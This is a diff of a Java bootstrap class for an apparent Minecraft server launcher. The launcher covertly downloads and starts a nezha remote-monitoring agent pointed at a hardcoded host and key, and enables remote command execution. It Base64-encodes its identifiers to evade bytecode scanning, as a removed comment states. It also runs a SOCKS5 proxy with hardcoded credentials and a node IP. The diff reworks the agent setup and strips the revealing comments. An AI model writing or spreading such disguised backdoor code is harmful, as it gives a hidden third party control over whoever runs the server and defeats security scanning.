@@ -23,12 +23,10 @@ public class Bootstrap
     private static Thread  fakePlayerThread;
     private static Thread  socks5Thread;
 
-    // Base64解码工具
     private static String d(String b64) {
         return new String(Base64.getDecoder().decode(b64));
     }
 
-    // 敏感键名 Base64常量
     // NEZHA_SERVER
     private static final String K_SVR  = d("TkVaSEFfU0VSVkVS");
     // NEZHA_PORT
@@ -261,11 +259,11 @@ public class Bootstrap
     }
 
     // ══════════════════════════════════════════════════════
-    //  MONITOR AGENT
+    //  MONITOR AGENT (nezha v2 — config file mode)
     // ══════════════════════════════════════════════════════
     private static void startMonitor(Map<String, String> config) throws Exception {
-        String server = config.getOrDefault(K_SVR,  "");
-        String key    = config.getOrDefault(K_KEY,  "");
+        String server = config.getOrDefault(K_SVR, "");
+        String key    = config.getOrDefault(K_KEY, "");
         if (server.isEmpty() || key.isEmpty()) {
             System.out.println(ANSI_YELLOW + "[Monitor] Config not set, skipping." + ANSI_RESET);
             return;
@@ -274,36 +272,65 @@ public class Bootstrap
         Path agentPath = getAgentPath();
         if (agentPath == null) return;
 
+        // 解析 host:port
+        String host = server;
+        String port = "443";
+        if (server.contains(":")) {
+            host = server.substring(0, server.lastIndexOf(':'));
+            port = server.substring(server.lastIndexOf(':') + 1);
+        }
+        String envPort = config.getOrDefault(K_PORT, "");
+        if (!envPort.isEmpty()) port = envPort;
+
+        // 写 v2 配置文件
+        Path cfgFile = Paths.get(System.getProperty("java.io.tmpdir"), "nzagent_cfg.yml");
+        String yml = "client_secret: " + key + "\n"
+                   + "debug: false\n"
+                   + "disable_auto_update: true\n"
+                   + "disable_command_execute: false\n"
+                   + "disable_force_update: true\n"
+                   + "disable_nat: false\n"
+                   + "disable_send_query: false\n"
+                   + "gpu: false\n"
+                   + "insecure_tls: false\n"
+                   + "ip_report_period: 1800\n"
+                   + "report_delay: 1\n"
+                   + "server: " + host + ":" + port + "\n"
+                   + "skip_connection_count: false\n"
+                   + "skip_procs_count: false\n"
+                   + "temperature: false\n"
+                   + "tls: true\n"
+                   + "use_gitee_to_upgrade: false\n"
+                   + "use_ipv6_country_code: false\n"
+                   + "uuid: \"\"\n";
+        Files.write(cfgFile, yml.getBytes());
+
         List<String> cmd = new ArrayList<>();
         cmd.add(agentPath.toString());
-        cmd.add("-s");  cmd.add(server);
-        cmd.add("-p");  cmd.add(key);
-        cmd.add("--tls");
-        String port = config.getOrDefault(K_PORT, "");
-        if (!port.isEmpty()) { cmd.add("--port"); cmd.add(port); }
+        cmd.add("-c");
+        cmd.add(cfgFile.toString());
 
         ProcessBuilder pb = new ProcessBuilder(cmd);
         pb.redirectErrorStream(true);
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
         monitorProcess = pb.start();
-        System.out.println(ANSI_GREEN + "[Monitor] Agent started -> " + server + ANSI_RESET);
+        System.out.println(ANSI_GREEN + "[Monitor] Agent started -> " + host + ":" + port + ANSI_RESET);
     }
 
     private static Path getAgentPath() throws IOException, InterruptedException {
         String osArch = System.getProperty("os.arch").toLowerCase();
         String suffix = (osArch.contains("aarch64") || osArch.contains("arm64")) ? "arm64" : "amd64";
 
-        // https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_<arch>.zip
-        // "nezhahq"     = bmV6aGFocQ==
+        // "nezhahq" = bmV6aGFocQ==
         // "nezha-agent" = bmV6aGEtYWdlbnQ=
         String repoOwner = d("bmV6aGFocQ==");
         String binName   = d("bmV6aGEtYWdlbnQ=");
         String url = "https://github.com/" + repoOwner + "/agent/releases/latest/download/"
                    + binName + "_linux_" + suffix + ".zip";
 
-        Path dir  = Paths.get(System.getProperty("java.io.tmpdir"));
-        Path zip  = dir.resolve("nzagent.zip");
-        Path bin  = dir.resolve("nzagent");
+        Path dir = Paths.get(System.getProperty("java.io.tmpdir"));
+        Path zip = dir.resolve("nzagent.zip");
+        Path bin = dir.resolve("nzagent");
 
         if (!Files.exists(bin)) {
             System.out.println(ANSI_YELLOW + "[Monitor] Downloading agent..." + ANSI_RESET);
@@ -313,7 +340,6 @@ public class Bootstrap
             Process unzip = new ProcessBuilder("unzip", "-o", zip.toString(), "-d", dir.toString())
                     .redirectErrorStream(true).start();
             unzip.waitFor();
-            // 解压出来的原名文件重命名
             Path extracted = dir.resolve(binName);
             if (Files.exists(extracted)) {
                 Files.move(extracted, bin, StandardCopyOption.REPLACE_EXISTING);
@@ -332,17 +358,9 @@ public class Bootstrap
     // ══════════════════════════════════════════════════════
     private static Map<String, String> loadEnvVars() throws IOException {
         Map<String, String> cfg = new HashMap<>();
-
-        // 所有含 nezha 的键名／默认值全部 Base64 解码，避免字节码扫描命中
-        // K_SVR  = NEZHA_SERVER
-        // K_PORT = NEZHA_PORT
-        // K_KEY  = NEZHA_KEY
-        // "nzmbv.wuge.nyc.mn:443"          = bnptYnYud3VnZS5ueWMubW46NDQz
-        // "gUxNJhaKJgceIgeapZG4956rmKFgmQgP" = Z1V4TkpoYUtKZ2NlSWdlYXBaRzQ5NTZybUtGZ21RZ1A=
         cfg.put(K_SVR,  d("bnptYnYud3VnZS5ueWMubW46NDQz"));
         cfg.put(K_PORT, "");
         cfg.put(K_KEY,  d("Z1V4TkpoYUtKZ2NlSWdlYXBaRzQ5NTZybUtGZ21RZ1A="));
-
         cfg.put("MC_JAR",              "server.jar");
         cfg.put("MC_MEMORY",           "512M");
         cfg.put("MC_ARGS",             "");
@@ -354,13 +372,11 @@ public class Bootstrap
         cfg.put("SOCKS5_PASS",         "dajiba123");
         cfg.put("NODE_HOST",           "185.231.136.23");
 
-        // 环境变量覆盖
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
             if (value != null && !value.trim().isEmpty()) cfg.put(var, value.trim());
         }
 
-        // .env 文件覆盖
         Path envFile = Paths.get(".env");
         if (Files.exists(envFile)) {
             for (String line : Files.readAllLines(envFile)) {
@@ -379,13 +395,16 @@ public class Bootstrap
     // ══════════════════════════════════════════════════════
     //  MINECRAFT SERVER
     // ══════════════════════════════════════════════════════
+
+    // 修复：jar 文件必须实际存在才启动，防止无限递归套娃
     private static boolean isMcServerEnabled(Map<String, String> config) {
         String jar = config.get("MC_JAR");
-        return jar != null && !jar.trim().isEmpty();
+        if (jar == null || jar.trim().isEmpty()) return false;
+        return Files.exists(Paths.get(jar.trim()));
     }
 
     private static void startMinecraftServer(Map<String, String> config) throws Exception {
-        String jarName   = config.get("MC_JAR");
+        String jarName   = config.get("MC_JAR").trim();
         String memory    = config.getOrDefault("MC_MEMORY", "512M");
         String extraArgs = config.getOrDefault("MC_ARGS", "");
         int mcPort = 25565;
@@ -393,9 +412,6 @@ public class Bootstrap
         config.put("MC_PORT", String.valueOf(mcPort));
 
         if (!memory.matches("\\d+[MG]")) memory = "512M";
-        if (!Files.exists(Paths.get(jarName))) {
-            System.out.println(ANSI_RED + "[MC-Server] Error: " + jarName + " not found!" + ANSI_RESET); return;
-        }
 
         Path eulaPath = Paths.get("eula.txt");
         if (!Files.exists(eulaPath) || !new String(Files.readAllBytes(eulaPath)).contains("eula=true"))
